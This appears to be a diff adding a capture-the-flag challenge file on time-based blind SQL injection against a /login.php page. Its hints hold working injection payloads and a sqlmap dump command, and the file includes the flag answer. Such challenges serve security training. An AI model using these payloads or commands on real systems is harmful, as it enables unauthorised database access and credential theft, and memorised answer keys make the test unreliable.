@@ -1,0 +1,19 @@
+{
+  "id": "web-sqli-002",
+  "title": "Blind SQL Injection",
+  "category": "web",
+  "difficulty": "hard",
+  "points": 400,
+  "description": "A login page at /login.php is vulnerable to blind SQL injection. The backend query is:\n\nSELECT * FROM accounts WHERE user='$input' AND pass='$pass'\n\nYou discover that sending this payload in the username field causes a 5-second delay:\n\n' OR SLEEP(5)-- -\n\nThis confirms time-based blind SQLi. The database is 'users_db' and the table is 'accounts' with columns 'user' and 'pass'.\n\nThe admin's password hash (MD5) is: 5f4dcc3b5aa765d61d8327deb882cf99\n\nSubmit the hash as the flag.",
+  "flag": "flag{5f4dcc3b5aa765d61d8327deb882cf99}",
+  "hints": [
+    "Use time-based blind SQLi: ' OR IF(SUBSTRING(pass,1,1)='5',SLEEP(5),0)-- -",
+    "Extract the hash character by character using SUBSTRING()",
+    "Or use sqlmap: sqlmap -u 'http://target/login.php' --data 'user=a&pass=b' --dump"
+  ],
+  "resources": [
+    "https://portswigger.net/web-security/sql-injection/blind",
+    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+  ],
+  "ncl_category": "Web Application Exploitation"
+}
